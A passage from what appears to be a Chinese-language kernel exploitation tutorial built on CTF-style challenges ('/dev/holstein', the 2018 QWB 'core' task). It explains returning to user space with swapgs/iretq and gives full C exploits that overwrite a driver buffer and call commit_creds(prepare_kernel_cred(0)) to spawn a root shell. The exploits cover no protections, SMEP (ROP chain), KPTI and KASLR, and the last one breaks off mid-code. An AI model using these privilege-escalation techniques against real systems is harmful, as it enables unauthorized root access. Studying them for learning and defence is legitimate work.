||</span><br><span class="line">	    !gid_eq(old-&gt;egid, new-&gt;egid) ||</span><br><span class="line">	    !uid_eq(old-&gt;fsuid, new-&gt;fsuid) ||</span><br><span class="line">	    !gid_eq(old-&gt;fsgid, new-&gt;fsgid) ||</span><br><span class="line">	    !cred_cap_issubset(old, new)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (task-&gt;mm)</span><br><span class="line">			set_dumpable(task-&gt;mm, suid_dumpable);</span><br><span class="line">		task-&gt;pdeath_signal = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If a task drops privileges and becomes nondumpable,</span></span><br><span class="line"><span class="comment">		 * the dumpability change must become visible before</span></span><br><span class="line"><span class="comment">		 * the credential change; otherwise, a __ptrace_may_access()</span></span><br><span class="line"><span class="comment">		 * racing with this change may be able to attach to a task it</span></span><br><span class="line"><span class="comment">		 * shouldn&#x27;t be able to attach to (as if the task had dropped</span></span><br><span class="line"><span class="comment">		 * privileges without becoming nondumpable).</span></span><br><span class="line"><span class="comment">		 * Pairs with a read barrier in __ptrace_may_access().</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		smp_wmb();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* alter the thread keyring */</span></span><br><span class="line">	<span class="keyword">if</span> (!uid_eq(new-&gt;fsuid, old-&gt;fsuid))</span><br><span class="line">		key_fsuid_changed(new);</span><br><span class="line">	<span class="keyword">if</span> (!gid_eq(new-&gt;fsgid, old-&gt;fsgid))</span><br><span class="line">		key_fsgid_changed(new);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* do it</span></span><br><span class="line"><span class="comment">	 * RLIMIT_NPROC limits on user-&gt;processes have already been checked</span></span><br><span class="line"><span class="comment">	 * in set_user().</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (new-&gt;user != old-&gt;user || new-&gt;user_ns != old-&gt;user_ns)</span><br><span class="line">		inc_rlimit_ucounts(new-&gt;ucounts, UCOUNT_RLIMIT_NPROC, <span class="number">1</span>);</span><br><span class="line">	rcu_assign_pointer(task-&gt;real_cred, new);</span><br><span class="line">	rcu_assign_pointer(task-&gt;cred, new);</span><br><span class="line">	<span class="keyword">if</span> (new-&gt;user != old-&gt;user || new-&gt;user_ns != old-&gt;user_ns)</span><br><span class="line">		dec_rlimit_ucounts(old-&gt;ucounts, UCOUNT_RLIMIT_NPROC, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* send notifications */</span></span><br><span class="line">	<span class="keyword">if</span> (!uid_eq(new-&gt;uid,   old-&gt;uid)  ||</span><br><span class="line">	    !uid_eq(new-&gt;euid,  old-&gt;euid) ||</span><br><span class="line">	    !uid_eq(new-&gt;suid,  old-&gt;suid) ||</span><br><span class="line">	    !uid_eq(new-&gt;fsuid, old-&gt;fsuid))</span><br><span class="line">		proc_id_connector(task, PROC_EVENT_UID);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!gid_eq(new-&gt;gid,   old-&gt;gid)  ||</span><br><span class="line">	    !gid_eq(new-&gt;egid,  old-&gt;egid) ||</span><br><span class="line">	    !gid_eq(new-&gt;sgid,  old-&gt;sgid) ||</span><br><span class="line">	    !gid_eq(new-&gt;fsgid, old-&gt;fsgid))</span><br><span class="line">		proc_id_connector(task, PROC_EVENT_GID);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* release the old obj and subj refs both */</span></span><br><span class="line">	put_cred_many(old, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="返回到用户空间"><a href="#返回到用户空间" class="headerlink" title="返回到用户空间"></a>返回到用户空间</h2><blockquote>
<p>在 Kernel Exploit 中，我们创建了触发漏洞的程序（进程），因此我们可以通过在 ROP 结束后将 RSP 返回到用户空间，并将 RIP 设置为接受 shell 的函数来返回用户空间。这是一种从用户空间移动到内核空间的方法，但这是通过 CPU 指令切换特权模式来实现的。 从用户空间到内核空间的唯一方法通常是系统调用 <code>syscall</code> 和中断 <code>int</code>。 而要从内核空间返回到用户空间，通常使用 <code>sysretq</code> 和 <code>iretq</code> 指令。 <code>由于 iretq</code> 比 <code>sysretq</code> 更简单，因此内核漏洞利用通常使用 <code>iretq</code>。 此外，从内核返回到用户空间时，必须从内核模式 GS 段切换到用户模式 GS 段。 为此，Intel 提供了 <code>swapgs</code> 指令。</p>
<p>除了用户空间 RSP 和 RIP 之外，还必须将 CS、SS 和 RFLAGS 转换回用户空间 RSP。 RSP 可以位于任何位置，并且 RIP 可以设置为启动 shell 的函数。 其余的 registers 可以用于它们最初在 user space 中的值，所以让我们准备一个辅助函数来存储 registers 的值，如下所示。 </p>
</blockquote>
<h2 id="实现1-无保护"><a href="#实现1-无保护" class="headerlink" title="实现1.(无保护)"></a>实现1.(无保护)</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_cs, user_ss, user_rsp, user_rflags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> prepare_kernel_cred = <span class="number">0xffffffff8106e240</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> commit_creds = <span class="number">0xffffffff8106e390</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> *argv[] = &#123; <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="type">char</span> *envp[] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] win!&quot;</span>);</span><br><span class="line">  execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, envp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">asm</span>(</span><br><span class="line">      <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">      <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">      <span class="string">&quot;movq %%rsp, %2\n&quot;</span></span><br><span class="line">      <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">      <span class="string">&quot;popq %3\n&quot;</span></span><br><span class="line">      : <span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rsp), <span class="string">&quot;=r&quot;</span>(user_rflags)</span><br><span class="line">      :</span><br><span class="line">      : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">restore_state</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;swapgs ;&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %0, 0x20(%%rsp)\t\n&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %1, 0x18(%%rsp)\t\n&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %2, 0x10(%%rsp)\t\n&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %3, 0x08(%%rsp)\t\n&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;movq %4, 0x00(%%rsp)\t\n&quot;</span></span></span><br><span class="line"><span class="params">               <span class="string">&quot;iretq&quot;</span></span></span><br><span class="line"><span class="params">               :</span></span><br><span class="line"><span class="params">               : <span class="string">&quot;r&quot;</span>(user_ss),</span></span><br><span class="line"><span class="params">                 <span class="string">&quot;r&quot;</span>(user_rsp),</span></span><br><span class="line"><span class="params">                 <span class="string">&quot;r&quot;</span>(user_rflags),</span></span><br><span class="line"><span class="params">                 <span class="string">&quot;r&quot;</span>(user_cs), <span class="string">&quot;r&quot;</span>(win))</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">escalate_privilege</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = (<span class="type">void</span>*)(prepare_kernel_cred);</span><br><span class="line">  <span class="type">void</span> (*cc)(<span class="type">char</span>*) = (<span class="type">void</span>*)(commit_creds);</span><br><span class="line">  (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">  restore_state();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fatal</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  save_state();</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/dev/holstein&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) fatal(<span class="string">&quot;open(\&quot;/dev/holstein\&quot;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x410</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x410</span>);</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf[<span class="number">0x408</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)&amp;escalate_privilege;</span><br><span class="line">  write(fd, buf, <span class="number">0x410</span>);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="实现2（smep保护）"><a href="#实现2（smep保护）" class="headerlink" title="实现2（smep保护）"></a>实现2（smep保护）</h2><blockquote>
<p>将学习如何利用kernel gadget</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh extract-vmlinux bzImage &gt; vmlinux</span><br><span class="line">ROPgadget --binary vmlinux --only &quot;pop|ret&quot;</span><br><span class="line">ROPgadget --binary vmlinux --only &quot;swapgs|ret&quot;</span><br><span class="line">ROPgadget --binary vmlinux --only &quot;mov|rep|ret&quot;</span><br><span class="line">objdump -S -M intel vmlinux | grep iretq</span><br><span class="line">ROPgadget --binary vmlinux |grep &quot;swapgs&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_cs, user_ss, user_rsp, user_rflags;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prepare_kernel_cred 0xffffffff8106e240</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> commit_creds        0xffffffff8106e390</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_pop_rdi               0xffffffff8127bbdc</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_pop_rcx               0xffffffff8132cdd3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_mov_rdi_rax_rep_movsq 0xffffffff8160c96b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_swapgs                0xffffffff8160bf7e</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_iretq                 0xffffffff810202af</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> *argv[] = &#123; <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="type">char</span> *envp[] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] win!&quot;</span>);</span><br><span class="line">  execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, envp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">asm</span>(</span><br><span class="line">      <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">      <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">      <span class="string">&quot;movq %%rsp, %2\n&quot;</span></span><br><span class="line">      <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">      <span class="string">&quot;popq %3\n&quot;</span></span><br><span class="line">      : <span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rsp), <span class="string">&quot;=r&quot;</span>(user_rflags)</span><br><span class="line">      :</span><br><span class="line">      : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fatal</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  save_state();</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/dev/holstein&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) fatal(<span class="string">&quot;open(\&quot;/dev/holstein\&quot;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x410</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x410</span>);</span><br><span class="line"><span class="comment">//  *(unsigned long*)&amp;buf[0x408] = (unsigned long)&amp;escalate_privilege;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> *chain = (<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf[<span class="number">0x408</span>];</span><br><span class="line">  *chain++ = rop_pop_rdi;</span><br><span class="line">  *chain++ = <span class="number">0x0</span>;</span><br><span class="line">  *chain++ = prepare_kernel_cred;</span><br><span class="line">  *chain++ = rop_pop_rcx;</span><br><span class="line">  *chain++ = <span class="number">0x0</span>;</span><br><span class="line">  *chain++ = rop_mov_rdi_rax_rep_movsq;</span><br><span class="line">  *chain++ = commit_creds;</span><br><span class="line">  *chain++ = rop_swapgs;</span><br><span class="line">  *chain++ = rop_iretq;</span><br><span class="line">  *chain++ = (<span class="type">unsigned</span> <span class="type">long</span>)&amp;win;</span><br><span class="line">  *chain++ = user_cs;</span><br><span class="line">  *chain++ = user_rflags;</span><br><span class="line">  *chain++ = user_rsp;</span><br><span class="line">  *chain++ = user_ss;</span><br><span class="line">  write(fd, buf, (<span class="type">void</span>*)chain - (<span class="type">void</span>*)buf);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="实现3（KPTI保护）"><a href="#实现3（KPTI保护）" class="headerlink" title="实现3（KPTI保护）"></a>实现3（KPTI保护）</h2><blockquote>
<p>页表保护</p>
</blockquote>
<h3 id="如何检查："><a href="#如何检查：" class="headerlink" title="如何检查："></a>如何检查：</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /sys/devices/system/cpu/vulnerabilities/meltdown</span><br></pre></td></tr></table></figure>

<blockquote>
<p>利用<code>swapgs_restore_regs_and_return_to_usermode</code></p>
<p>或利用：signal(SIGSEGV, win);函数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_cs, user_ss, user_rsp, user_rflags;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prepare_kernel_cred 0xffffffff8106e240</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> commit_creds        0xffffffff8106e390</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_pop_rdi               0xffffffff8127bbdc</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_pop_rcx               0xffffffff8132cdd3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_mov_rdi_rax_rep_movsq 0xffffffff8160c96b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_swapgs                0xffffffff8160bf7e</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rop_iretq                 0xffffffff810202af</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> swapgs_restore_regs_and_return_to_usermode 0xFFFFFFFF81800E26</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> *argv[] = &#123; <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="type">char</span> *envp[] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] win!&quot;</span>);</span><br><span class="line">  execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, envp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">asm</span>(</span><br><span class="line">      <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">      <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">      <span class="string">&quot;movq %%rsp, %2\n&quot;</span></span><br><span class="line">      <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">      <span class="string">&quot;popq %3\n&quot;</span></span><br><span class="line">      : <span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rsp), <span class="string">&quot;=r&quot;</span>(user_rflags)</span><br><span class="line">      :</span><br><span class="line">      : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fatal</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  save_state();</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/dev/holstein&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) fatal(<span class="string">&quot;open(\&quot;/dev/holstein\&quot;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x410</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x410</span>);</span><br><span class="line"><span class="comment">//  *(unsigned long*)&amp;buf[0x408] = (unsigned long)&amp;escalate_privilege;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> *chain = (<span class="type">unsigned</span> <span class="type">long</span>*)&amp;buf[<span class="number">0x408</span>];</span><br><span class="line">  *chain++ = rop_pop_rdi;</span><br><span class="line">  *chain++ = <span class="number">0x0</span>;</span><br><span class="line">  *chain++ = prepare_kernel_cred;</span><br><span class="line">  *chain++ = rop_pop_rcx;</span><br><span class="line">  *chain++ = <span class="number">0x0</span>;</span><br><span class="line">  *chain++ = rop_mov_rdi_rax_rep_movsq;</span><br><span class="line">  *chain++ = commit_creds;</span><br><span class="line">  *chain++ = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">  *chain++ = <span class="number">0</span>;</span><br><span class="line">  *chain++ = <span class="number">0</span>;</span><br><span class="line">  *chain++ =  (<span class="type">unsigned</span> <span class="type">long</span>*)win;;</span><br><span class="line">  *chain++ = user_cs;</span><br><span class="line">  *chain++ = user_rflags;</span><br><span class="line">  *chain++ = user_rsp;</span><br><span class="line">  *chain++ = user_ss;</span><br><span class="line">  write(fd, buf, (<span class="type">void</span>*)chain - (<span class="type">void</span>*)buf);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="实现4（KALSR保护）"><a href="#实现4（KALSR保护）" class="headerlink" title="实现4（KALSR保护）"></a>实现4（KALSR保护）</h2><blockquote>
<p>以强王杯2018 强网杯 core为例子</p>
<p><a href="https://eternalsakura13.com/2018/03/31/b_core/">https://eternalsakura13.com/2018/03/31/b_core/</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc exp.c -static -masm=intel -g -o exp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ 0x6677889B</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OFF 0x6677889C</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COPY 0x6677889A</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">calloc</span>(<span class="number">0x1000</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;\033[32m\033[1m[+] %s\033[0m&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fail</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">calloc</span>(<span class="number">0x1000</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;\033[31m\033[1m[x] %s\033[0m&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">debug</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">calloc</span>(<span class="number">0x1000</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;\033[34m\033[1m[*] %s\033[0m&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">printvar</span><span class="params">(<span class="type">void</span> handle(<span class="type">const</span> <span class="type">char</span> *), <span class="type">char</span> *hint, <span class="type">size_t</span> var)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">calloc</span>(<span class="number">0x1000</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;%s: 0x%lx\n&quot;</span>, hint, var);</span><br><span class="line">    handle(buf);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> commit_creds,prepare_kernel_cred,off,swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    user_sp &amp;= ~<span class="number">0xf</span>;</span><br><span class="line">    success(<span class="string">&quot;Status has been saved.\n&quot;</span>);</span><br><span class="line">    printvar(debug, <span class="string">&quot;cs&quot;</span>, user_cs);</span><br><span class="line">    printvar(debug, <span class="string">&quot;ss&quot;</span>, user_ss);</span><br><span class="line">    printvar(debug, <span class="string">&quot;rsp&quot;</span>, user_sp);</span><br><span class="line">    printvar(debug, <span class="string">&quot;rflags&quot;</span>, user_rflags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leakAddr</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *kallsyms = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (!commit_creds || !prepare_kernel_cred ) &#123;</span><br><span class="line">        <span class="type">size_t</span> addr = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span> t[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;, name[<span class="number">128</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">fscanf</span>(kallsyms, <span class="string">&quot;%lx%s%s&quot;</span>, &amp;addr, t, name);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span 